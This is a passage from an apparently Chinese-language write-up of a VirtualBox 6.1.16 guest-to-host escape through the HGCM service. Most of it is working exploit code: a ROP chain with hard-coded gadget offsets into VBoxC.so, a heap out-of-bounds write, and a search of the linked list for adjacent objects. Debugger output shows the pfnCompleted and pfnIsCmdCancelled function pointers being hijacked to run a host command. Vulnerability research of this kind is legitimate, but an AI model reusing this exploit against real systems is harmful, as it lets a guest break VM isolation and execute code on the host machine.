    struct HGCMMsgCallInfo *curObj = calloc(1, sizeof(HGCMMsgCallInfo));  
    seekObj(curObj);  
    uint64_t curAddr = 0;     //current object heap addr, get it later  
    uint64_t vboxcAddr = 0;   //caculate it later for different vbox version  
    /* Looking for a pattern chunk to place our data */  
    uint8_t *cmdStr = "/usr/bin/gnome-calculator\n";  
    uint64_t *vulnPattern = calloc(1, patternSize);  
    vboxcAddr = curObj->vtableAddr - 0x61FB28;  //caculate base addr of VBoxC.so in debug version  
    vulnPattern[0] = 0x0;                       //rbp for leave in gadget1  
    vulnPattern[1] = vboxcAddr + 0x11A1EB;      //pop r12; pop rbp; ret; gadget2  
    vulnPattern[2] = vboxcAddr + 0x33d1AE;      //xchg rax, rbp; fcos; leave; ret; rax = pattern chunk heap addr, gadget1 for stack pivot  
    vulnPattern[3] = vboxcAddr + 0x647078 + 0x8;//strcmp .got.plt + 0x8  
    vulnPattern[4] = vboxcAddr + 0x114385;      //mov rax, qword ptr [rbp - 8]; pop rbp; ret; gadget3  
    vulnPattern[5] = 0x0;                       //rbp  
    vulnPattern[6] = vboxcAddr + 0x27f773;      //pop rcx; ret; gadget4  
    vulnPattern[7] = 0xFFFFFFFFFFECE8B0;        //rcx  
    vulnPattern[8] = vboxcAddr + 0x19D50E;      //add rax, rcx; pop rbp; ret; gadget5  
    vulnPattern[9] = 0x0;                       //rbp  
    vulnPattern[10] = vboxcAddr + 0x38695C;     //add rdx, 0x98; mov rdi, rdx; call rax; gadget6  
    memcpy(vulnPattern + 19, cmdStr, strlen(cmdStr));   //cmd string at rdx + 0x98  
    if(strlen(cmdStr) + 0x98 > patternSize){  
        printf("[+]Error: rop gadgets length is larger than pattern chunk size\n");  
        exit(-1);  
    }  
    uint64_t patternPos = seekPattern("dataprop", patternSize); //mark curent chunk data offset, in order to caculate heap addr larter  
    oobWriteAdd(vulnPattern, patternSize);  
    uint64_t patternAddr = 0;               //pattern chunk heap addr  
    /* Looking for cur->pPrev or cur->pNext object in the double link */  
    sleep(3);  
    uint32_t tryTime = 0;  
    uint32_t objOffset = 0;  
    uint32_t fdOffset = 0;  
    uint32_t bkOffset = 0;  
    struct HGCMMsgCallInfo *nextObj = calloc(1, sizeof(HGCMMsgCallInfo));  
    for(tryTime = 0; tryTime curPos - curObj->curPos;  
        fdOffset = curObj->pPrev - nextObj->pNext;  
        bkOffset = curObj->pNext - nextObj->pPrev;  
        printf("[+]Checking object offset = 0x%llx, forward link offset = 0x%llx, backward link offset = 0x%llx\n", objOffset, fdOffset, bkOffset);  
        if(objOffset == fdOffset){  
            printf("[+]Get pPrev of current object, curObj addr = 0x%llx\n", nextObj->pNext);  
            curAddr = nextObj->pNext;  
            break;  
        } else if(objOffset == bkOffset){  
            printf("[+]Get pNext of current object, curObj addr = 0x%llx\n", nextObj->pPrev);  
            curAddr = nextObj->pPrev;  
            break;  
        }  
        /* If we cannot find adjacent object with limited attempt, update current object and pattern chunk, goto next trail loop */  
        if((tryTime != 0) && (tryTime%3 == 0)){  
            memcpy(curObj, nextObj, sizeof(HGCMMsgCallInfo));  
            printf("[+]Update current object and pattern chunk for a new trail, curPos = 0x%llx\n", curObj->curPos);  
            patternPos = seekPattern("dataprop", patternSize);  
            oobWriteAdd(vulnPattern, patternSize);  
        }  
    }
以下是HGCMMsgCall->pHGCMPort字段所包含的接口函数，若客户机用户程序不发送任何后续消息，主机进程将调用pfnCompleted接口函数完成当前HGCMMsgCall结构体的处理；若客户机再次使用对应的ClientID发送GetNotification调用消息，主机进程将调用pfnIsCmdCancelled接口函数取消原HGCMMsgCall结构体表示的消息。
    typedef struct PDMIHGCMPORT {  
        DECLR3CALLBACKMEMBER(int, pfnCompleted,(PPDMIHGCMPORT pInterface, int32_t rc, PVBOXHGCMCMD pCmd));  
        DECLR3CALLBACKMEMBER(bool, pfnIsCmdRestored,(PPDMIHGCMPORT pInterface, PVBOXHGCMCMD pCmd));  
        DECLR3CALLBACKMEMBER(bool, pfnIsCmdCancelled,(PPDMIHGCMPORT pInterface, PVBOXHGCMCMD pCmd));  
        DECLR3CALLBACKMEMBER(uint32_t, pfnGetRequestor,(PPDMIHGCMPORT pInterface, PVBOXHGCMCMD pCmd));  
        DECLR3CALLBACKMEMBER(uint64_t, pfnGetVMMDevSessionId,(PPDMIHGCMPORT pInterface));  
    } PDMIHGCMPORT;
劫持pfnCompleted接口函数的情形如下，函数参数为pMsgHdr->pHGCMPort、result和pMsgHdr->pCmd。
    RAX  0xffffffd9  
     RBX  0x7f3cb8001638 —▸ 0x7f3cb8012290 —▸ 0x7f3cb80122d0 —▸ 0x7f3cb8012310 —▸ 0x7f3cb8012350 ◂— ...  
     RCX  0x7f3cd45e3398 ◂— 0x4242424242424242 ('BBBBBBBB')  
     RDX  0x7f3cd45e3398 ◂— 0x4242424242424242 ('BBBBBBBB')  
     RDI  0x7f3cd45e3398 ◂— 0x4242424242424242 ('BBBBBBBB')  
     RSI  0xffffffd9  
     R8   0x4242424242424242 ('BBBBBBBB')  
     R9   0x7f3cfcb460e8 ◂— 'void PGMPhysReleasePageMappingLock(PVMCC, PPGMPAGEMAPLOCK)'  
     ...  
    ─────────────────────────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────────────────────────  
     ► 0x7f3cffcf4cc0    call   r8   
       0x7f3cffcf4cc3    jmp    0x7f3cffcf4cd1   
       0x7f3cffcf4cc5    mov    eax, 0xfffffe99  
       0x7f3cffcf4cca    jmp    0x7f3cffcf4cd1   
       0x7f3cffcf4ccc    mov    eax, 0xffffa87d  
       0x7f3cffcf4cd1    leave    
       0x7f3cffcf4cd2    ret      
       ...  
    ─────────────────────────────────────────────────────────────[ SOURCE (CODE) ]──────────────────────────────────────────────────────────────  
    In file: /home/john/Application/VirtualBox-6.1.16/src/VBox/Main/src-client/HGCM.cpp  
        997     LogFlow(("MAIN::hgcmMsgCompletionCallback: message %p\n", pMsgCore));  
        998   
        999     if (pMsgHdr->pHGCMPort)  
       1000     {  
       1001         if (!g_fResetting)  
     ► 1002             return pMsgHdr->pHGCMPort->pfnCompleted(pMsgHdr->pHGCMPort,  
       1003                                                     g_fSaveState ? VINF_HGCM_SAVE_STATE : result, pMsgHdr->pCmd);  
       1004         return VERR_ALREADY_RESET; /* best I could find. */  
       1005     }  
       1006     return VERR_NOT_AVAILABLE;  
       1007 }
劫持pfnIsCmdCancelled接口函数的情形如下，函数参数为pMsgHdr->pHGCMPort和pMsgHdr->pCmd。本文通过这里的rax寄存器和"xchg
rax, rbp"gadget实现stackpivot，并进一步构造ROP达到命令执行。
    *RAX  0x7f86305e4b58 ◂— 0x4242424242424242 ('BBBBBBBB') pHGCMPort  
     RBX  0x7f865d5f42be (HGCMService::svcHlpIsCallCancelled(VBOXHGCMCALLHANDLE_TYPEDEF*)) ◂— endbr64   
    *RCX  0x4242424242424242 ('BBBBBBBB')  
    *RDX  0x7f86305e4b58 ◂— 0x4242424242424242 ('BBBBBBBB') pCmd  
    *RDI  0x7f86305e4b58 ◂— 0x4242424242424242 ('BBBBBBBB') pHGCMPort  
    *RSI  0x7f86305e4b58 ◂— 0x4242424242424242 ('BBBBBBBB') pCmd  
    *R8   0x7f85bdb05d60 ◂— 0x3  
     R9   0x4  
     ...  
    ─────────────────────────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────────────────────────  
     ► 0x7f865d5f44cf     call   rcx   
       0x7f865d5f44d1     nop      
       0x7f865d5f44d2     leave    
       0x7f865d5f44d3     ret      
       ...  
    ─────────────────────────────────────────────────────────────[ SOURCE (CODE) ]──────────────────────────────────────────────────────────────  
    In file: /home/john/Application/VirtualBox-6.1.16/src/VBox/Main/src-client/HGCM.cpp  
       902     AssertPtrReturn(pCmd, false);  
       903   
       904     PPDMIHGCMPORT pHgcmPort = pMsgHdr->pHGCMPort;  
       905     AssertPtrReturn(pHgcmPort, false);  
       906   
     ► 907     return pHgcmPort->pfnIsCmdCancelled(pHgcmPort, pCmd);  
       908 }  
       909
## 4.Demo
参考链接：  